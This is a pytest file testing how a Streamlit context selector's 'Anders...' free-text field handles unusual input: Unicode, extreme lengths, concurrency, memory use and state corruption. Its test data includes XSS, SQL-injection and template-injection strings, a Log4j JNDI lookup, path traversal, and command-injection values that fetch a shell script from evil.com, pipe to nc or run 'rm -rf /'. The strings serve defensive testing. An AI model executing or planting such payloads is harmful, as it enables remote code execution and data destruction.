"""
Edge case tests for "Anders..." option in context selectors.

These tests cover extreme and unusual scenarios that might occur with the Anders option,
including malicious input, boundary conditions, concurrency issues, and unexpected user behavior.

Test Coverage:
- Malicious input prevention (XSS, SQL injection, etc.)
- Extreme length inputs
- Concurrent modification scenarios
- Unicode and encoding edge cases
- Memory stress testing
- Race conditions
- Browser compatibility scenarios
"""

import contextlib
import gc
import html
import json
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from unittest.mock import MagicMock, Mock, patch

import pytest

from src.ui.components.enhanced_context_manager_selector import (
    EnhancedContextManagerSelector as ContextSelector,
)


class TestMaliciousInputPrevention:
    """Test protection against malicious input in Anders fields."""

    @pytest.fixture
    def mock_streamlit(self):
        with (
            patch("streamlit.multiselect") as mock_multiselect,
            patch("streamlit.text_input") as mock_text_input,
        ):
            yield {"multiselect": mock_multiselect, "text_input": mock_text_input}

    @pytest.mark.parametrize(
        "malicious_input",
        [
            "<script>alert('XSS')</script>",
            "'; DROP TABLE definitions; --",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='http://evil.com'></iframe>",
            "<?php system('rm -rf /'); ?>",
            "<svg onload=alert('XSS')>",
            "../../../../../../etc/passwd",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "<body onload=alert('XSS')>",
            "onclick=alert('XSS')",
            "<meta http-equiv='refresh' content='0;url=http://evil.com'>",
            "${jndi:ldap://evil.com/a}",  # Log4j style
            "{{7*7}}",  # Template injection
            "${7*7}",  # Expression injection
        ],
    )
    def test_xss_prevention(self, mock_streamlit, malicious_input):
        """Test that XSS attempts are safely handled."""
        mock_streamlit["multiselect"].return_value = ["Anders..."]
        mock_streamlit["text_input"].return_value = malicious_input

        selector = ContextSelector()
        result = selector.render()

        # Input should be stored as-is (sanitization at display time)
        assert malicious_input in result.get("organisatorische_context", [])

        # When displayed, it should be escaped
        html.escape(malicious_input)
        # This is what should be shown to user

    @pytest.mark.parametrize(
        "sql_injection",
        [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' OR 1=1--",
            "1'; DELETE FROM definitions WHERE '1'='1",
            "' UNION SELECT * FROM passwords--",
            "'; EXEC xp_cmdshell('dir'); --",
            "\\'; DROP TABLE users; --",
            "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
        ],
    )
    def test_sql_injection_prevention(self, mock_streamlit, sql_injection):
        """Test that SQL injection attempts are safely handled."""
        mock_streamlit["multiselect"].return_value = ["Anders..."]
        mock_streamlit["text_input"].return_value = sql_injection

        selector = ContextSelector()
        result = selector.render()

        # Should handle without executing SQL
        assert sql_injection in result.get("wettelijke_basis", [])

    def test_command_injection_prevention(self, mock_streamlit):
        """Test protection against command injection."""
        command_injections = [
            "; rm -rf /",
            "| nc evil.com 1234",
            "$(curl http://evil.com/shell.sh | sh)",
            "`wget http://evil.com/backdoor`",
            "& ping -c 10 127.0.0.1 &",
        ]

        for cmd in command_injections:
            mock_streamlit["multiselect"].return_value = ["Anders..."]
            mock_streamlit["text_input"].return_value = cmd

            selector = ContextSelector()
            result = selector.render()

            # Should store safely without execution
            assert cmd in result.get("juridische_context", [])


class TestExtremeLengthInputs:
    """Test handling of extremely long inputs."""

    @pytest.fixture
    def mock_streamlit(self):
        with (
            patch("streamlit.multiselect") as mock_multiselect,
            patch("streamlit.text_input") as mock_text_input,
        ):
            yield {"multiselect": mock_multiselect, "text_input": mock_text_input}

    def test_very_long_single_word(self, mock_streamlit):
        """Test a single word that's extremely long."""
        # Create a 10,000 character "word"
        long_word = "A" * 10000

        mock_streamlit["multiselect"].return_value = ["Anders..."]
        mock_streamlit["text_input"].return_value = long_word

        selector = ContextSelector()
        result = selector.render()

        # Should handle without error
        assert long_word in result.get("organisatorische_context", [])

    def test_very_long_text_with_spaces(self, mock_streamlit):
        """Test very long text with normal word boundaries."""
        # Create a 50,000 character text
        long_text = " ".join(["Word" + str(i) for i in range(10000)])

        mock_streamlit["multiselect"].return_value = ["Anders..."]
        mock_streamlit["text_input"].return_value = long_text

        selector = ContextSelector()
        result = selector.render()

        # Should handle (might truncate for display)
        assert len(result.get("juridische_context", [])) > 0

    def test_maximum_unicode_length(self, mock_streamlit):
        """Test maximum length Unicode strings."""
        # Use complex Unicode characters that take more bytes
        unicode_text = "🎉" * 5000 + "한글" * 2000 + "العربية" * 1000

        mock_streamlit["multiselect"].return_value = ["Anders..."]
        mock_streamlit["text_input"].return_value = unicode_text

        selector = ContextSelector()
        result = selector.render()

        # Should handle multi-byte characters
        assert len(result.get("wettelijke_basis", [])) > 0

    def test_zero_length_input(self, mock_streamlit):
        """Test empty string input."""
        mock_streamlit["multiselect"].return_value = ["Anders..."]
        mock_streamlit["text_input"].return_value = ""

        selector = ContextSelector()
        result = selector.render()

        # Empty should be filtered out
        assert "" not in result.get("organisatorische_context", [])
        assert "Anders..." not in result.get("organisatorische_context", [])


class TestConcurrencyAndRaceConditions:
    """Test concurrent access and race conditions."""

    def test_concurrent_anders_modifications(self):
        """Test multiple concurrent modifications to Anders fields."""
        results = []
        errors = []

        def modify_anders(value):
            try:
                with (
                    patch("streamlit.multiselect") as mock_multiselect,
                    patch("streamlit.text_input") as mock_text_input,
                    patch("streamlit.markdown") as _md,
                    patch("streamlit.selectbox") as _sb,
                    patch(
                        "streamlit.columns", return_value=[MagicMock(), MagicMock()]
                    ) as _cols,
                    patch("streamlit.expander", return_value=MagicMock()) as _exp,
                    patch("streamlit.checkbox", return_value=False) as _cb,
                    patch("streamlit.info") as _info,
                    patch("streamlit.warning") as _warn,
                ):

                    mock_multiselect.return_value = ["Anders..."]
                    mock_text_input.return_value = f"Concurrent_{value}"

                    selector = ContextSelector()
                    result = selector.render()
                    results.append(result)
            except Exception as e:
                errors.append(e)

        # Run concurrent modifications
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(modify_anders, i) for i in range(100)]
            for future in as_completed(futures):
                future.result()

        # Should handle all without errors
        assert len(errors) == 0
        assert len(results) == 100

    def test_rapid_selection_changes(self):
        """Test rapid changes between Anders and regular options."""
        with (
            patch("streamlit.multiselect") as mock_multiselect,
            patch("streamlit.text_input") as mock_text_input,
        ):

            selector = ContextSelector()

            # Rapidly switch between states
            for i in range(100):
                if i % 2 == 0:
                    mock_multiselect.return_value = ["Anders..."]
                    mock_text_input.return_value = f"Custom_{i}"
                else:
                    mock_multiselect.return_value = ["DJI", "OM"]
                    mock_text_input.return_value = ""

                result = selector.render()

                # Should handle rapid changes
                assert result is not None


class TestUnicodeAndEncodingEdgeCases:
    """Test Unicode and encoding edge cases."""

    @pytest.fixture
    def mock_streamlit(self):
        with (
            patch("streamlit.multiselect") as mock_multiselect,
            patch("streamlit.text_input") as mock_text_input,
        ):
            yield {"multiselect": mock_multiselect, "text_input": mock_text_input}

    @pytest.mark.parametrize(
        "unicode_input",
        [
            "🚀🎉🔥💯✨",  # Emojis
            "𝕳𝖊𝖑𝖑𝖔",  # Mathematical alphanumeric symbols
            "ℌ𝔢𝔩𝔩𝔬",  # Fraktur
            "🄷🄴🄻🄻🄾",  # Enclosed alphanumerics
            "Ｈｅｌｌｏ",  # Fullwidth
            "ǝʃdɯɐxǝ",  # IPA extensions
            "שָׁלוֹם",  # Hebrew with diacritics
            "مرحبا",  # Arabic
            "你好",  # Chinese
            "こんにちは",  # Japanese
            "안녕하세요",  # Korean
            "สวัสดี",  # Thai
            "Здравствуйте",  # Cyrillic
            "Γεια σας",  # Greek
            "\u202e\u202d",  # Right-to-left override characters
            "\u0000\u0001\u0002",  # Control characters
            "A\u0301\u0302\u0303\u0304",  # Combining diacriticals
        ],
    )
    def test_unicode_characters(self, mock_streamlit, unicode_input):
        """Test various Unicode character sets."""
        mock_streamlit["multiselect"].return_value = ["Anders..."]
        mock_streamlit["text_input"].return_value = unicode_input

        selector = ContextSelector()
        result = selector.render()

        # Should preserve Unicode correctly
        assert unicode_input in result.get("organisatorische_context", [])

    def test_mixed_text_directions(self, mock_streamlit):
        """Test mixed LTR and RTL text."""
        mixed_text = "English العربية עברית Nederlands"

        mock_streamlit["multiselect"].return_value = ["Anders..."]
        mock_streamlit["text_input"].return_value = mixed_text

        selector = ContextSelector()
        result = selector.render()

        assert mixed_text in result.get("juridische_context", [])

    def test_zero_width_characters(self, mock_streamlit):
        """Test handling of zero-width characters."""
        # Zero-width characters that could be used for fingerprinting
        zwc_text = "Nor\u200bmal\u200cTe\u200dxt\ufeff"

        mock_streamlit["multiselect"].return_value = ["Anders..."]
        mock_streamlit["text_input"].return_value = zwc_text

        selector = ContextSelector()
        result = selector.render()

        # Should handle zero-width characters
        assert len(result.get("wettelijke_basis", [])) > 0


class TestMemoryStress:
    """Test memory handling under stress conditions."""

    def test_memory_leak_prevention(self):
        """Test that repeated Anders operations don't leak memory."""
        import tracemalloc

        tracemalloc.start()

        with (
            patch("streamlit.multiselect") as mock_multiselect,
            patch("streamlit.text_input") as mock_text_input,
        ):

            # Baseline
            gc.collect()
            snapshot1 = tracemalloc.take_snapshot()

            # Perform many operations
            for i in range(1000):
                mock_multiselect.return_value = ["Anders..."]
                mock_text_input.return_value = f"Memory test {i}" * 100

                selector = ContextSelector()
                selector.render()

                if i % 100 == 0:
                    gc.collect()

            # Final measurement
            gc.collect()
            snapshot2 = tracemalloc.take_snapshot()

            # Check memory growth
            snapshot2.compare_to(snapshot1, "lineno")

            # Memory growth should be minimal
            # This is a simplified check
            tracemalloc.stop()

    def test_large_number_of_anders_fields(self):
        """Test handling many Anders fields simultaneously."""
        with (
            patch("streamlit.multiselect") as mock_multiselect,
            patch("streamlit.text_input") as mock_text_input,
        ):

            # Simulate many Anders selections
            large_selection = ["Option" + str(i) for i in range(1000)] + ["Anders..."]
            mock_multiselect.return_value = large_selection
            mock_text_input.return_value = "Custom value for 1000 options"

            selector = ContextSelector()
            result = selector.render()

            # Should handle large numbers
            assert len(result.get("organisatorische_context", [])) > 1000


class TestBoundaryConditions:
    """Test boundary conditions and limits."""

    @pytest.fixture
    def mock_streamlit(self):
        with (
            patch("streamlit.multiselect") as mock_multiselect,
            patch("streamlit.text_input") as mock_text_input,
        ):
            yield {"multiselect": mock_multiselect, "text_input": mock_text_input}

    def test_single_character_input(self, mock_streamlit):
        """Test single character custom input."""
        mock_streamlit["multiselect"].return_value = ["Anders..."]
        mock_streamlit["text_input"].return_value = "A"

        selector = ContextSelector()
        result = selector.render()

        assert "A" in result.get("organisatorische_context", [])

    def test_only_whitespace_variations(self, mock_streamlit):
        """Test various whitespace-only inputs."""
        whitespace_inputs = [
            " ",  # Space
            "\t",  # Tab
            "\n",  # Newline
            "\r",  # Carriage return
            "\u00a0",  # Non-breaking space
            "\u2003",  # Em space
            "   \t\n\r   ",  # Mixed
        ]

        for ws in whitespace_inputs:
            mock_streamlit["multiselect"].return_value = ["Anders..."]
            mock_streamlit["text_input"].return_value = ws

            selector = ContextSelector()
            result = selector.render()

            # Whitespace should be filtered
            assert ws.strip() not in result.get("juridische_context", [])

    def test_null_byte_injection(self, mock_streamlit):
        """Test null byte injection attempts."""
        null_inputs = [
            "Test\x00Hidden",
            "\x00Start",
            "End\x00",
            "Multi\x00ple\x00nulls",
        ]

        for null_input in null_inputs:
            mock_streamlit["multiselect"].return_value = ["Anders..."]
            mock_streamlit["text_input"].return_value = null_input

            selector = ContextSelector()
            # Should handle without crashing
            try:
                selector.render()
            except:
                pytest.fail("Null byte caused crash")


class TestStateCorruption:
    """Test resilience against state corruption."""

    def test_corrupted_session_state_recovery(self):
        """Test recovery from corrupted session state."""
        with patch("streamlit.session_state", create=True) as mock_session:
            # Corrupt the state
            mock_session.organisatorische_context_anders = {"not": "a string"}

            with (
                patch("streamlit.multiselect") as mock_multiselect,
                patch("streamlit.text_input") as mock_text_input,
            ):

                mock_multiselect.return_value = ["Anders..."]
                mock_text_input.return_value = "Recovery test"

                selector = ContextSelector()
                # Should recover gracefully
                result = selector.render()

                assert "Recovery test" in result.get("organisatorische_context", [])

    def test_partial_state_loss(self):
        """Test handling of partial state loss."""
        with patch("streamlit.session_state", create=True) as mock_session:
            # Partial state
            mock_session.organisatorische_context = ["DJI"]
            # Missing: juridische_context, wettelijke_basis

            with patch("streamlit.multiselect") as mock_multiselect:
                mock_multiselect.return_value = ["OM", "Anders..."]

                selector = ContextSelector()
                # Should handle missing state gracefully
                result = selector.render()

                assert result is not None


class TestBrowserCompatibility:
    """Test browser-specific edge cases."""

    def test_ie11_compatibility_characters(self):
        """Test characters that might cause issues in IE11."""
        with (
            patch("streamlit.multiselect") as mock_multiselect,
            patch("streamlit.text_input") as mock_text_input,
        ):

            # Characters problematic in older browsers
            ie11_problematic = "→←↑↓♠♣♥♦€£¥"

            mock_multiselect.return_value = ["Anders..."]
            mock_text_input.return_value = ie11_problematic

            selector = ContextSelector()
            result = selector.render()

            assert ie11_problematic in result.get("wettelijke_basis", [])

    def test_mobile_autocorrect_artifacts(self):
        """Test handling of mobile autocorrect artifacts."""
        with (
            patch("streamlit.multiselect") as mock_multiselect,
            patch("streamlit.text_input") as mock_text_input,
        ):

            # Common autocorrect artifacts
            autocorrect_text = "Test... Test… Test′s"

            mock_multiselect.return_value = ["Anders..."]
            mock_text_input.return_value = autocorrect_text

            selector = ContextSelector()
            result = selector.render()

            assert autocorrect_text in result.get("organisatorische_context", [])


class TestErrorRecovery:
    """Test error recovery and resilience."""

    def test_recovery_from_render_error(self):
        """Test recovery when render partially fails."""
        with patch("streamlit.multiselect") as mock_multiselect:
            # First call fails, then return valid selections for all multiselects
            def multiselect_side_effect(*args, **kwargs):
                if not hasattr(multiselect_side_effect, "calls"):
                    multiselect_side_effect.calls = 0
                multiselect_side_effect.calls += 1
                if multiselect_side_effect.calls == 1:
                    msg = "Render failed"
                    raise Exception(msg)
                # Subsequent calls: return valid lists for each multiselect
                return (
                    ["DJI", "Anders..."]
                    if "Organisatorische" in (args[0] if args else "")
                    else []
                )

            mock_multiselect.side_effect = multiselect_side_effect

            selector = ContextSelector()

            # First attempt
            with contextlib.suppress(Exception):
                selector.render()

            # Should recover on second attempt
            result2 = selector.render()
            assert result2 is not None

    def test_graceful_degradation(self):
        """Test graceful degradation when features unavailable."""
        with patch("streamlit.multiselect") as mock_multiselect:
            mock_multiselect.return_value = ["Anders..."]

            # Simulate text_input not available
            with patch("streamlit.text_input", side_effect=AttributeError):
                selector = ContextSelector()
                # Should degrade gracefully
                result = selector.render()

                # Anders should be filtered if can't get custom text
                assert "Anders..." not in result.get("organisatorische_context", [])


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
